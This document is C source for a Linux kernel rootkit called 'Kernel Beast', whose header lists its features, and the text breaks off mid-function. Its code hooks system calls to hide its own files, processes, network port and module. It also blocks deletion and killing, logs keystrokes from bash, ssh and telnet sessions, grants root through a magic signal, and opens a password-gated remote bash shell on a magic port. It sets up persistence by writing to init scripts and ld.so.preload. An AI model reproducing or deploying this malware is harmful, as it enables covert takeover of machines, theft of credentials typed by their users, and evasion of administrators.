/*
Kernel Beast Ver #1.0 - Kernel Module
Copyright Ph03n1X of IPSECS (c) 2011
Get more research of ours http://ipsecs.com

Features:
- Hiding this module [OK]
- Hiding files/directory [OK]
- Hiding process [OK]
- Hiding from netstat [OK]
- Keystroke Logging [OK]
- Anti-kill process [OK]
- Anti-remove files [OK]
- Anti-delete modules [OK]
- Local root escalation [OK]
*/

#include <linux/module.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/tty.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>
#include <linux/sched.h>
#include <linux/file.h>  
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <net/tcp.h>

#include <linux/fs.h>

#include <linux/socket.h>
#include <linux/net.h>
#include <linux/unistd.h>
#include <asm/socket.h>


#include "config.h"

#define TIMEZONE 7*60*60	// GMT+7
#define SECS_PER_HOUR   (60 * 60)
#define SECS_PER_DAY    (SECS_PER_HOUR * 24)
#define isleap(year) \
  ((year) % 4 == 0 && ((year) % 100 != 0 || (year) % 400 == 0))
#define DIV(a, b) ((a) / (b) - ((a) % (b) < 0))
#define LEAPS_THRU_END_OF(y) (DIV (y, 4) - DIV (y, 100) + DIV (y, 400))
#define TMPSZ 150 //from net/ipv4/tcp_ipv4.c

struct vtm {
  int tm_sec;
  int tm_min;
  int tm_hour;
  int tm_mday;
  int tm_mon;
  int tm_year;
};

MODULE_LICENSE("GPL");

/*Functions*/
int log_to_file(char *); 
int writeInit(void);
int delInit(void);
void get_time(char *);
int epoch2time(const time_t *, long int, struct vtm *);
char *strnstr(const char *, const char *, size_t);
int h4x_tcp4_seq_show(struct seq_file *, void *);
int isPreExist(void);
int writePreload(void);
int delPreload(void);
int rmPreload(void);


/*Syscalls*/
asmlinkage int (*o_read) (unsigned int, char __user *, size_t);
asmlinkage int (*o_write)(unsigned int, const char __user *, size_t);
#if defined(__x86_64__)
 asmlinkage int (*o_getdents)(unsigned int, struct linux_dirent __user *, unsigned int);
#elif defined(__i386__)
 asmlinkage int (*o_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);
#else
 #error Unsupported architecture
#endif
asmlinkage int (*o_unlink)(const char __user *);
asmlinkage int (*o_rmdir)(const char __user *);
asmlinkage int (*o_unlinkat)(int, const char __user *, int);
asmlinkage int (*o_rename)(const char __user *, const char __user *);
asmlinkage int (*o_open)(const char __user *, int, int);
asmlinkage int (*o_kill)(int, int); 
asmlinkage int (*o_execve)(const char *filename, char *const argv[],char *const envp[]);
asmlinkage int (*o_truncate)(const char *path, off_t length); 


#ifdef hook_accept
asmlinkage int (*o_accept)(int fd, struct sockaddr *addr, int *addr_len);
asmlinkage int (*o_close)(int fd);
asmlinkage int (*o_dup2)(int oldfd, int newfd);
asmlinkage int (*o_fork)(void); 
asmlinkage int (*o_exit)(int argv1);
//asmlinkage int (*o_waitpid)(int pid);
#endif

#ifdef MAGIC_REBOOT
//for hooking reboot
asmlinkage int (*o_signal)(int argv1, int argv2);
asmlinkage int (*o_reboot)(int magic, int magic2, int cmd, void *arg);
#endif
 
asmlinkage int (*o_delete_module)(const char __user *name_user, unsigned int flags);

/*Variable*/
char ibuffer[256];
char obuffer[512]; 
char spbuffer[4];
char accountlog[32]; 
char rebootfile[32];  
char fbuf[1024]={'\0'};
char wbuf[512]={'\0'};
int hasPreload=0;
int counter=0;
int trace = 0;
int load = 1;
int started = 0;
int force_load = 0;
int mycount =0;
int mypid = 0;
int haswrite = 0;
int todo = 0;
char *argv[] = { "bash", "-i", NULL };
char *envp[] = { "TERM=linux", "PS1=[root@remote-server]#", "BASH_HISTORY=/dev/null",
                 "HISTORY=/dev/null", "history=/dev/null", "HOME=/usr/sbin/dnsdyn","HISTFILE=/dev/null",
                 "PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin", NULL };

unsigned long *sys_call_table = (unsigned long *)0xc061c4e0;
int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;

/*
REF : http://commons.oreilly.com/wiki/index.php/Network_Security_Tools/
      Modifying_and_Hacking_Security_Tools/Fun_with_Linux_Kernel_Modules
*/
char *strnstr(const char *haystack, const char *needle, size_t n)
{
  char *s=strstr(haystack, needle);
  if(s==NULL)
    return NULL;
  if(s-haystack+strlen(needle) <= n)
    return s;
  else
    return NULL;
}

/*Ripped from epoch2time() thc-vlogger*/
int epoch2time (const time_t *t, long int offset, struct vtm *tp)
{
  static const unsigned short int mon_yday[2][13] = {
   /* Normal years.  */
   { 0, 31, 59, 90, 120, 151, 181, 212, 243, 273, 304, 334, 365 },
   /* Leap years.  */
   { 0, 31, 60, 91, 121, 152, 182, 213, 244, 274, 305, 335, 366 }
  };

  long int days, rem, y;
  const unsigned short int *ip;

  days = *t / SECS_PER_DAY;
  rem = *t % SECS_PER_DAY;
  rem += offset;
  while (rem < 0) { 
    rem += SECS_PER_DAY;
    --days;
  }
  while (rem >= SECS_PER_DAY) {
    rem -= SECS_PER_DAY;
    ++days;
  }
  tp->tm_hour = rem / SECS_PER_HOUR;
  rem %= SECS_PER_HOUR;
  tp->tm_min = rem / 60;
  tp->tm_sec = rem % 60;
  y = 1970;

  while (days < 0 || days >= (isleap (y) ? 366 : 365)) {
    long int yg = y + days / 365 - (days % 365 < 0);
    days -= ((yg - y) * 365 + LEAPS_THRU_END_OF (yg - 1) - LEAPS_THRU_END_OF (y - 1));
    y = yg;
  }
  tp->tm_year = y - 1900;
  if (tp->tm_year != y - 1900)
    return 0;
  ip = mon_yday[isleap(y)];
    for (y = 11; days < (long int) ip[y]; --y)
      continue;
    days -= ip[y];
    tp->tm_mon = y;
    tp->tm_mday = days + 1;
    return 1;
}

/*Ripped from get_time() thc-vlogger*/
void get_time (char *date_time) 
{
  struct timeval tv;
  time_t t;
  struct vtm tm;
	
  do_gettimeofday(&tv);
  t = (time_t)tv.tv_sec;
	
  epoch2time(&t, TIMEZONE, &tm);

  sprintf(date_time,"%.2d/%.2d/%d-%.2d:%.2d:%.2d", tm.tm_mday,
	tm.tm_mon + 1, tm.tm_year + 1900, tm.tm_hour, tm.tm_min,
	tm.tm_sec);
}

/*
Modified from log_to_file() mercenary code
why don't we modify thc-vlogger? because that'z your job
*/
int log_to_file(char *buffer)
{
  struct file *file = NULL;
  mm_segment_t fs;
  int error;
  
  /*log name*/
  snprintf(accountlog,sizeof(accountlog),"%s/%s.%i",_H4X_PATH_,_LOGFILE_,current->uid);
  file = filp_open(accountlog, O_CREAT|O_APPEND, 00644);
  if(IS_ERR(file)){
    error=PTR_ERR(file);
    goto out;
  }
  
  error = -EACCES;
  if(!S_ISREG(file->f_dentry->d_inode->i_mode))
  goto out_err;
  
  error = -EIO;
  if(!file->f_op->write)
  goto out_err;
  
  error = 0;
  fs = get_fs();
  set_fs(KERNEL_DS);
  file->f_op->write(file,buffer,strlen(buffer),&file->f_pos);
  set_fs(fs);
  filp_close(file,NULL);
  goto out;
    
  out:
	return error;

  out_err:
	filp_close (file,NULL);
	goto out;
}





#ifdef hook_accept
int my_accept(int sockfd, struct sockaddr *addr, int *addrlen)
{

	int cli;
	cli = (*o_accept)(sockfd,addr, addrlen);
	if( (addr->sa_family == AF_INET) ){
		struct sockaddr_in *cli_addr = (struct sockaddr_in *)addr;
		if( (cli_addr->sin_port == htons(_MAGIC_PORT_)) ){
			pid_t child;
			if(cli<0)
				return cli;
			o_signal(SIGCHLD, SIG_IGN);
			if((child=o_fork())==0){
				//old none-crypted style
			   	o_close(sockfd);
			  	o_dup2(cli,0);
			   	o_dup2(cli,1);
			   	o_dup2(cli,2);
				//close(0);
				//fid = fcntl(cli, F_DUPFD, 0);
			   	//enterpass(cli);
				//char *motd="<< Welcome >>\n";
				char buffer[64]={'\0'};
				
			    o_read(cli,buffer,sizeof(buffer));
							/*
							//Hash password
							char trans[SALT_LENGTH+33] = {'\0'};
						  	char tmp[3]={'\0'},buf[33]={'\0'},hash[33]={'\0'};
							int i;
							for(i=0;i<strlen(buffer);i++){
								if(buffer[i]==0x00){
									break;
								}
							}
							if(i>2)
								i--;
						  	getMD5(buffer,i,buf);
							strncpy(trans,_SALT_,SALT_LENGTH);
							for(i=0;i<32;i++){
									trans[SALT_LENGTH+i]=buf[i];
							}
							getMD5(trans,SALT_LENGTH+32,hash);
							printf("%s",hash);
							//End Hash Password
							*/
				//if(!strncmp(hash, _RPASSWORD_, strlen(_RPASSWORD_))) {
				if(!strncmp(buffer, _ACK_PWD_, strlen(_ACK_PWD_))) {
					//write(cli,motd,strlen(motd));
					o_execve("/bin/bash", argv, envp);
					//printf("disConnected.");
					o_close(cli);
					o_exit(0);
				}else {
					//write(s,"Wrong!\n", 7);
					o_close(cli); 
					o_exit(0);
				}
			   	
			}
			//o_waitpid(child);
			return -1;
		}
	}
	return cli;
}

asmlinkage int h4x_fork(void){
	snprintf(obuffer,sizeof(obuffer),"******mypid:%i;comm:%s\n",mypid,current->comm);
	log_to_file(obuffer);
	if(!mypid && strstr(current->comm,APP_NAME) ){
		int res = o_fork();
		if(res>0)
			mypid = res;
		return res;
		/*
		snprintf(obuffer,sizeof(obuffer),"******mypid:%i\n",mypid);
		log_to_file(obuffer);
		return mypid;
		*/
	}else{
		return o_fork();
	}
}

#endif

/*
REF : http://commons.oreilly.com/wiki/index.php/Network_Security_Tools/
      Modifying_and_Hacking_Security_Tools/Fun_with_Linux_Kernel_Modules
*/
int h4x_tcp4_seq_show(struct seq_file *seq, void *v)
{
  int r=old_tcp4_seq_show(seq, v);
  char port[12];

  sprintf(port,"%04X",_HIDE_PORT_);
  if(strnstr(seq->buf+seq->count-TMPSZ,port,TMPSZ))
    seq->count -= TMPSZ;
  return r;   
}

/*
Modified from hacked sys_read on merecenary code
Why don't we modify thc-vlogger? it's your duty
Somehow this h4x_read doesn't cool enough, but works :) 
*/
asmlinkage int h4x_read(unsigned int fd, char __user *buf, size_t count)
{
  int i,r;
  char date_time[24];
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);

  /*If output is redirected to file or grep, hide it*/
  copy_from_user(kbuf,buf,255);
/*
  if ((strstr(current->comm,"ps"))||(strstr(current->comm,"pstree"))||
      (strstr(current->comm,"top"))||(strstr(current->comm,"lsof"))){
    if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST))
    {
      kfree(kbuf);
      return -ENOENT;
    }
  }
*/ 
  
		//if ( (strstr(current->comm,"ps")) || (strstr(current->comm,"pstree")) || 
		//	 (strstr(current->comm,"ls")) || (strstr(current->comm,"lpstat")) || 
		//	(strstr(current->comm,"top")) || (strstr(current->comm,"lsof")) )
		 
		if( ( (load && started) || force_load ) && !trace && (todo > 0) ){
		//if( ( (load && started) || force_load ) && !trace ){
			if( strstr(current->comm,"mysql")  || strstr(current->comm,"sshd") || strstr(current->comm,"ls") || strstr(current->comm,"ps") || strstr(current->comm,"top") || strstr(current->comm,"grep")
			 	|| strstr(current->comm,"lsof")  || strstr(current->comm,"sendmail") && !strstr(current->comm,"lpstat") 
			 	|| strstr(current->comm,"xinetd") || strstr(current->comm,"ftp") || strstr(current->comm,"http") || strstr(current->comm,"ngin") || strstr(current->comm,"netst") ||strstr(current->comm,"pstree") ){
      	    	//hasPreload = isPreExist();
				//writePreload();
                r=o_read(fd,buf,count);
				haswrite = 0;
				load =0;
				if(hasPreload){
					delPreload();
				}else{
					rmPreload();
				}
				#ifdef DEBUG
				snprintf(obuffer,sizeof(obuffer),"---Good Final Here Opened:%s\n",current->comm);
				log_to_file(obuffer);
				#endif
				return r;
			}
		}
		
		  
  r=o_read(fd,buf,count);
	
	#ifdef _KEYLOG_
  /*Due to stability issue, we limit the keylogging process*/
  if((strcmp(current->comm,"bash") == 0) || (strcmp(current->comm,"ssh") == 0)||
     (strcmp(current->comm,"scp") == 0) || (strcmp(current->comm,"telnet") == 0)||
     (strcmp(current->comm,"rsh") == 0) || (strcmp(current->comm,"rlogin") == 0)) 
	{    
    /*SPECIAL CHAR*/
    if (counter) {
      if (counter == 2) {  // Arrows + Break
        //left arrow
        if (buf[0] == 0x44) {
          strcat(ibuffer,"[LEFT]");
          counter = 0;
          goto END;
        }
        //right arrow
        if (buf[0] == 0x43) {
          strcat(ibuffer,"[RIGHT]");
          counter = 0;
          goto END;
        }
        //up arrow
        if (buf[0] == 0x41) {
          strcat(ibuffer,"[UP]");
          counter = 0;
          goto END;
        }
        //down arrow
        if (buf[0] == 0x42) {
          strcat(ibuffer,"[DOWN]");
          counter = 0;
          goto END;
        }
        //break
        if (buf[0] == 0x50) {
	  strcat(ibuffer,"[BREAK]");
	  counter = 0;
          goto END;
        }
        //numlock
        if(buf[0] == 0x47) {
	  strcat (ibuffer,"[NUMLOCK]");
	  counter = 0;
          goto END;
        }
        strncpy (spbuffer,buf,1);
        counter ++;
        goto END;
      }
  
      if (counter == 3) {   // F1-F5
        //F1
        if (buf[0] == 0x41) {
          strcat(ibuffer,"[F1]");
          counter = 0;
          goto END;
        }
        //F2
        if (buf[0] == 0x42) {
          strcat(ibuffer,"[F2]");
          counter = 0;
          goto END;
        }
        //F3
        if (buf[0] == 0x43) {
          strcat(ibuffer,"[F3]");
          counter = 0;
          goto END;
        }
        //F4
        if (buf[0] == 0x44) {
          strcat(ibuffer,"[F4]");
          counter = 0;
          goto END;
        }
        //F5
        if (buf[0] == 0x45) {
          strcat(ibuffer,"[F5]");
          counter = 0;
          goto END;
        }

        if (buf[0] == 0x7E) {     // PgUp, PgDown, Ins, ...
          //Page Up
          if (spbuffer[0] == 0x35)
            strcat(ibuffer,"[PGUP]");
          //Page Down
          if (spbuffer[0] == 0x36)
            strcat(ibuffer,"[PGDN]");
          //Delete
          if (spbuffer[0] == 0x33)
            strcat(ibuffer,"[DELETE]");
          //End
          if (spbuffer[0] == 0x34)
            strcat(ibuffer,"[END]");
          //Home
          if (spbuffer[0] == 0x31)
            strcat(ibuffer,"[HOME]");
          //Insert
          if (spbuffer[0] == 0x32)
            strcat(ibuffer,"[INSERT]");
          counter = 0;
          goto END;
        }

        if (spbuffer[0] == 0x31) {  // F6-F8
          //F6
          if (buf[0] == 0x37)
            strcat(ibuffer,"[F6]");
          //F7
          if (buf[0] == 0x38)
            strcat(ibuffer,"[F7]");
          //F8
          if (buf[0] == 0x39)
            strcat(ibuffer,"[F8]");
          counter++;
          goto END;
        }
  
        if (spbuffer[0] == 0x32) { // F9-F12
          //F9
          if (buf[0] == 0x30)
            strcat(ibuffer,"[F9]");
          //F10
          if (buf[0] == 0x31)
            strcat(ibuffer,"[F10]");
          //F11
          if (buf[0] == 0x33)
            strcat(ibuffer,"[F11]");
          //F12
          if (buf[0] == 0x34)
            strcat(ibuffer,"[F12]");
  
          counter++;
          goto END;
        }
      }
  
      if(counter >= 4) {  //WatchDog
        counter = 0;
        goto END;
      }
  
      counter ++;
      goto END;
    }
  
    /*SH, SSHD = 0 /TELNETD = 3/LOGIN = 4*/
    if(r==1 && (fd==0||fd==3||fd==4)){
      //CTRL+U
      if(buf[0]==0x15){ 
        ibuffer[0]='\0';
        goto END;
      }
      //TAB
      if(buf[0]==0x09){
        strcat(ibuffer,"[TAB]");
        counter = 0;
        goto END;
      }
      //CTRL+C
      if(buf[0]==0x03){
        strcat(ibuffer,"[CTRL+C]");
        counter = 0;
        goto END;
      }
      //CTRL+D
      if(buf[0]==0x03){
        strcat(ibuffer,"[CTRL+D]");
        counter = 0;
        goto END;
      }
      //CTRL+]
      if(buf[0]==0x1D){
        strcat(ibuffer,"[CTRL+]]");
        counter = 0;
        goto END;
      }
      //BACKSPACE 0x7F Local / 0x08 Remote
      if (buf[0] == 0x7F || buf[0] == 0x08) {
        if (ibuffer[strlen(ibuffer) - 1] == ']') {
          for (i=2;strlen(ibuffer);i++){
            if (ibuffer[strlen (ibuffer) - i] == '[') {
              ibuffer[strlen(ibuffer) - i] = '\0';
              break;
            }
          }
          goto END;
        }else {
          ibuffer[strlen(ibuffer) - 1] = '\0';
          goto END;
        }
      }
  
      if (buf[0] == 0x1B) {
        counter++;
        goto END;
      }
      if(buf[0] != '\n' && buf[0] != '\r'){
        strncat(ibuffer,buf,sizeof(ibuffer));
      }else{
        strcat(ibuffer,"\n");
        get_time(date_time);
        snprintf(obuffer,sizeof(obuffer),"[%s] - [UID = %i ] %s > %s",date_time,current->uid,current->comm,ibuffer);
	//I don't want to log buffer more than 60 chars, most of them are useless data
        if(strlen(ibuffer)<60) {
          log_to_file(obuffer);
        }
        ibuffer[0]='\0';
      }
    }
	}
  	#endif
  END:
  return r;
}

/*
h4x sys_write to fake output ps, pstree, top, & lsof. If its result redirected to
grep,our process will be displayed, but sysadmin don't know what string should be
grep-ed.
I try to h4x readdir or getdents to completely hide process, but chkrootkit found 
the hidden process, any better idea? comment are welcome.
*/

asmlinkage int h4x_write(unsigned int fd, const char __user *buf,size_t count)
{
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,buf,255);
  if ((strstr(current->comm,"ps"))||(strstr(current->comm,"pstree"))||
      (strstr(current->comm,"top"))||(strstr(current->comm,"lsof"))){
    if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST))
    {
      kfree(kbuf);
      return -ENOENT;
    }
  }
  //snprintf(obuffer,sizeof(obuffer),"rebootmagic");
  //log_to_file(obuffer);
  r=(*o_write)(fd,buf,count);
  kfree(kbuf);
  return r;
}

/*
REF : http://freeworld.thc.org/papers/LKM_HACKING.html
Modified for getdents64
*/

#if defined(__x86_64__)
asmlinkage int h4x_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count){
  struct dirent *dir2, *dir3;
  int r,t,n;

  r = (*o_getdents)(fd, dirp, count);
  if(r>0){
    dir2 = (struct dirent *)kmalloc((size_t)r, GFP_KERNEL);
    copy_from_user(dir2, dirp, r);
    dir3 = dir2;
    t=r;
    while(t>0){
      n=dir3->d_reclen;
      t-=n;
      if(strstr((char *) &(dir3->d_name),(char *) _H4X0R_)!=NULL || strstr((char *) &(dir3->d_name),(char *) KBEAST)!=NULL){
        if(t!=0)
          memmove(dir3,(char *) dir3+dir3->d_reclen,t);
        else
          dir3->d_off = 1024;
        r-=n;
      }
      if(dir3->d_reclen == 0){
        r -=t;
        t=0;
      }
      if(t!=0)
        dir3=(struct dirent *)((char *) dir3+dir3->d_reclen);
    }
    copy_to_user(dirp, dir2, r);
    kfree(dir2);
  }
  return r;
}
#elif defined(__i386__)
asmlinkage int h4x_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
  struct linux_dirent64 *dir2, *dir3;
  int r,t,n;

  r = (*o_getdents64)(fd, dirp, count);
  if(r>0){
    dir2 = (struct linux_dirent64 *)kmalloc((size_t)r, GFP_KERNEL);
    copy_from_user(dir2, dirp, r);
    dir3 = dir2;
    t=r;
    while(t>0){
      n=dir3->d_reclen;
      t-=n;
      if(strstr((char *) &(dir3->d_name),(char *) _H4X0R_)!=NULL || strstr((char *) &(dir3->d_name),(char *) KBEAST)!=NULL){
        if(t!=0)
          memmove(dir3,(char *) dir3+dir3->d_reclen,t);
        else
          dir3->d_off = 1024;
        r-=n;
      }
      if(dir3->d_reclen == 0){
        r -=t;
        t=0;
      }
      if(t!=0)
        dir3=(struct linux_dirent64 *)((char *) dir3+dir3->d_reclen);
    }
    copy_to_user(dirp, dir2, r);
    kfree(dir2);
  }
  return r;
}
#else
 #error Unsupported architecture
#endif

/*Don't allow your file to be removed (2.6.18)*/
asmlinkage int h4x_unlink(const char __user *pathname) {
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,pathname,255);
  if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)){
    kfree(kbuf);
    return -ESRCH;
  }

  r=(*o_unlink)(pathname);
  kfree(kbuf);
  return r;
}

/*Don't allow your directory to be removed (2.6.18)*/
asmlinkage int h4x_rmdir(const char __user *pathname) {
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,pathname,255);
  if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)){
    kfree(kbuf);
    return -ESRCH;
  }
  r=(*o_rmdir)(pathname);
  kfree(kbuf);
  return r;
}

/*Don't allow your file and directory to be removed (2.6.32)*/
asmlinkage int h4x_unlinkat(int dfd, const char __user * pathname, int flag) {
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,pathname,255);
  if(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST)){
    kfree(kbuf);
    return -ESRCH;
  }
  r=(*o_unlinkat)(dfd,pathname,flag);
  kfree(kbuf);
  return r;
}

/*Don't allow your file to be renamed/moved*/
asmlinkage int h4x_rename(const char __user *oldname, const char __user *newname) {
  int r;
  char *oldkbuf=(char*)kmalloc(256,GFP_KERNEL);
  char *newkbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(oldkbuf,oldname,255);
  copy_from_user(newkbuf,newname,255);
  if(strstr(oldkbuf,_H4X0R_)||strstr(newkbuf,_H4X0R_)||strstr(oldkbuf,KBEAST)||strstr(newkbuf,KBEAST)){
    kfree(oldkbuf);
    kfree(newkbuf);
    return -EACCES;
  }
  r=(*o_rename)(oldname,newname);
  kfree(oldkbuf);
  kfree(newkbuf);
  return r;
}
 
/*
write the init code to the specific files
*/
int writeInit(void)
{
	struct file *file = NULL;
  	mm_segment_t fs;
  	int error;
	loff_t pos,start,end;
  	/*log name*/   
	
  	//snprintf(accountlog,sizeof(accountlog),"%s/%s",_H4X_PATH_,_LOGFILE_,current->uid);
  	//file = filp_open(accountlog, O_CREAT|O_APPEND|O_RDWR, 00644);
	snprintf(rebootfile,sizeof(rebootfile),"%s",MAGIC_REBOOT);
	file = filp_open(rebootfile, O_RDWR|O_SYNC, 00644); 
  	if(IS_ERR(file)){
    	error=PTR_ERR(file);
    	goto out;
  	}

  	error = -EACCES;
  	if(!S_ISREG(file->f_dentry->d_inode->i_mode))
  		goto out_err;

  	error = -EIO;
  	if(!file->f_op->write)
  		goto out_err;

  	error = 0;
  	fs = get_fs();
  	set_fs(KERNEL_DS);  
	
	//file->f_op->write(file,buffer,strlen(buffer),&file->f_pos);  
	//to do ur evil things with files here
	end = start = pos = 0;
	char *tmp=(char*)kmalloc(1,GFP_KERNEL); 
	end = file->f_op->llseek(file,0,SEEK_END);
	#ifdef DEBUG
	snprintf(obuffer,sizeof(obuffer),"file_pos:%i \n",end);
	log_to_file(obuffer);
  	#endif
	do{
	    file->f_op->read(file,tmp,1,&pos); 
	 	
	  	if( strstr(tmp,"\n") ){
			#ifdef DEBUG
		 	snprintf(obuffer,sizeof(obuffer),"in if pos:%i,start:%i\n",pos,start); 
			log_to_file(obuffer); 
			#endif
			file->f_op->read(file,fbuf,(pos-start),&start);
			#ifdef DEBUG
			snprintf(obuffer,sizeof(obuffer),"-----%s\n",fbuf);
			log_to_file(obuffer);
			#endif  
			if( strstr(fbuf,"start()") || strstr(fbuf,"start)") ){ 
				snprintf(wbuf,sizeof(wbuf),MAGIC_REBOOT_CODE);
				
				#ifdef DEBUG  
				log_to_file("xxx");
				log_to_file(wbuf);
				snprintf(obuffer,sizeof(obuffer),"*******pos:%i,wbuf:%s,obuffer:%s \n",pos,wbuf,fbuf);
				log_to_file(obuffer); 
				#endif
				
				char *kbuf=(char*)kmalloc( (end-pos+1),GFP_KERNEL);
				memset(kbuf,'\0',sizeof(kbuf)); 
				start = pos;
				file->f_op->read(file,kbuf,(end-start),&start); 
				
				#ifdef DEBUG 
				snprintf(obuffer,sizeof(obuffer),"*******start:%i,pos:%i,kbuf:\n%s",start,pos,kbuf);
				log_to_file(obuffer);
				#endif
				if( !strstr(kbuf,MAGIC_REBOOT_CODE) ){
					file->f_op->write(file,wbuf,strlen(wbuf),&pos);
					
					#ifdef DEBUG  
					snprintf(obuffer,sizeof(obuffer),"\n***after write wbuf****start:%i,pos:%i\n",start,pos);
					log_to_file(obuffer);
					#endif 
					
					file->f_op->write(file,kbuf,strlen(kbuf),&pos);
				}  
				memset(wbuf,'\0',sizeof(wbuf));
				kfree(kbuf); 
				break;
			}
			start=pos;
			memset(fbuf,'\0',sizeof(fbuf));  	   
		} 
	}while( pos<end );
  	set_fs(fs);
  	filp_close(file,NULL); 
	
	//snprintf(obuffer,sizeof(obuffer),"readtest- > fbuf: %s\n",fbuf); 
	//printk("readtest->fbuf:%s\n",fbuf);
	//log_to_file(obuffer); 
  	goto out;
     
  out:
	return error;

  out_err:
	filp_close (file,NULL);
	#ifdef DEBUG  
	snprintf(obuffer,sizeof(obuffer),"error:%i\n",error); 
	log_to_file(obuffer);   
	//printk("fbuf read error\n,error:%i",error);
	#endif
	goto out;
}
 
int delInit(void){
	struct file *file = NULL;
  	mm_segment_t fs;
  	int error;
	loff_t pos,start,end;
  	/*log name*/   

  	//snprintf(accountlog,sizeof(accountlog),"%s/%s",_H4X_PATH_,_LOGFILE_,current->uid);
  	//file = filp_open(accountlog, O_CREAT|O_APPEND|O_RDWR, 00644);
	snprintf(rebootfile,sizeof(rebootfile),"%s",MAGIC_REBOOT);
	file = filp_open(rebootfile, O_RDWR|O_SYNC, 00644); 
  	if(IS_ERR(file)){
    	error=PTR_ERR(file);
    	goto out;
  	}

  	error = -EACCES;
  	if(!S_ISREG(file->f_dentry->d_inode->i_mode))
  		goto out_err;

  	error = -EIO;
  	if(!file->f_op->write)
  		goto out_err;

  	error = 0;
  	fs = get_fs();
  	set_fs(KERNEL_DS);  

	//file->f_op->write(file,buffer,strlen(buffer),&file->f_pos);  
	//to do ur evil things with files here
	end = start = pos = 0; 
	end = file->f_op->llseek(file,0,SEEK_END);
	char *kbuf=(char*)kmalloc(end+1,GFP_KERNEL);
	memset(kbuf,'\0',sizeof(kbuf));
	file->f_op->read(file,kbuf,end,&start);
	char *ptr = strstr(kbuf,MAGIC_REBOOT_CODE);
	if( ptr!=NULL ){
		int i;
		for(i=0;i<kbuf+end-ptr-sizeof(MAGIC_REBOOT_CODE);i++){
			ptr[i] = ptr[i+sizeof(MAGIC_REBOOT_CODE)-1];
		}
		ptr[i]='\0';
		file->f_op->write(file,kbuf,strlen(kbuf),&pos); 
	} 
  	set_fs(fs);
  	filp_close(file,NULL);
	kfree(kbuf); 
  	goto out;

  out:
	return error;

  out_err:
	filp_close (file,NULL);  
	goto out;
	
}

/*
Don't allow your process to be killed
Allow local root escalation using magic signal dan pid
*/
asmlinkage int h4x_kill(int pid, int sig) {
  int r;
  struct task_struct *cur;
  cur = find_task_by_pid(pid);
  if(sig == INFO_GID){
	mypid = pid;
	return 0;
  }
  if(cur){
    if( started && ( strstr(cur->comm,_H4X0R_)||strstr(cur->comm,KBEAST) ) ){
      return -ESRCH;
    }
  }
  if(sig == _MAGIC_SIG_ && pid == _MAGIC_PID_){
    current->uid=0;current->euid=0;current->gid=0;current->egid=0;return 0;
    return 0;
  } 
  r = (*o_kill)(pid,sig);
  return r;
}

asmlinkage int h4x_delete_module(const char __user *name_user, unsigned int flags){
  int r;
  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);
  copy_from_user(kbuf,name_user,255);
  if(strstr(kbuf,KBEAST)){
    kfree(kbuf);
    return -ESRCH;
  }
  r=(*o_delete_module)(name_user, flags);
  return r;
}
#ifdef MAGIC_REBOOT
asmlinkage int my_reboot(int magic, int magic2, int cmd, void *arg){
	snprintf(obuffer,sizeof(obuffer),"rebootmagic");
	log_to_file(obuffer);
	o_reboot(magic,magic2,cmd,arg);
}
asmlinkage int my_signal(int argv1, int argv2){
	snprintf(obuffer,sizeof(obuffer),"my_signal-argv1:%d,argv2:%d\n",argv1,argv2);
	log_to_file(obuffer);
	o_signal(argv1,argv2);
}
#endif 

/*
write the preload hook code to the ld.so.preload file
*/
int writePreload(void)
{
	struct file *file = NULL;
  	mm_segment_t fs;
  	int error;
	loff_t pos,end;
  	/*log name*/   
	
  	//snprintf(accountlog,sizeof(accountlog),"%s/%s",_H4X_PATH_,_LOGFILE_,current->uid);
  	//file = filp_open(accountlog, O_CREAT|O_APPEND|O_RDWR, 00644);
	memset(rebootfile,'\0',sizeof(rebootfile));
	snprintf(rebootfile,sizeof(rebootfile),"%s",CONFIG_FULLPATH);
	file = filp_open(rebootfile, O_RDWR|O_SYNC|O_CREAT|O_APPEND, 00644);
	haswrite = 1; 
  	if(IS_ERR(file)){
    	error=PTR_ERR(file);
    	goto out;
  	}

  	error = -EACCES;
  	if(!S_ISREG(file->f_dentry->d_inode->i_mode))
  		goto out_err;

  	error = -EIO;
  	if(!file->f_op->write)
  		goto out_err;

  	error = 0;
  	fs = get_fs();
  	set_fs(KERNEL_DS);  
	
	//file->f_op->write(file,buffer,strlen(buffer),&file->f_pos);  
	//to do ur evil things with files here
	end = pos = 0;
	end = file->f_op->llseek(file,0,SEEK_END);
	//#ifdef DEBUG
	snprintf(obuffer,sizeof(obuffer),"--writePreload--file_pos:%i \n",end);
	log_to_file(obuffer);
  	//#endif
 	
    char *kbuf=(char*)kmalloc(end+1,GFP_KERNEL);
	memset(kbuf,'\0',sizeof(kbuf));
	file->f_op->read(file,kbuf,end,&pos);
	if( strstr(kbuf,CONFIG_CODE)==NULL ){ 
		/*
		if(end >0 && kbuf[end]!='\n'){
			snprintf(wbuf,sizeof(wbuf),"\n%s",CONFIG_CODE); 
		}else{
			snprintf(wbuf,sizeof(wbuf),CONFIG_CODE);
		} 
		*/ 
		snprintf(wbuf,sizeof(wbuf),CONFIG_CODE);
		file->f_op->write(file,wbuf,strlen(wbuf),&pos);
		todo++; 
	}
	
  	set_fs(fs);
  	filp_close(file,NULL);
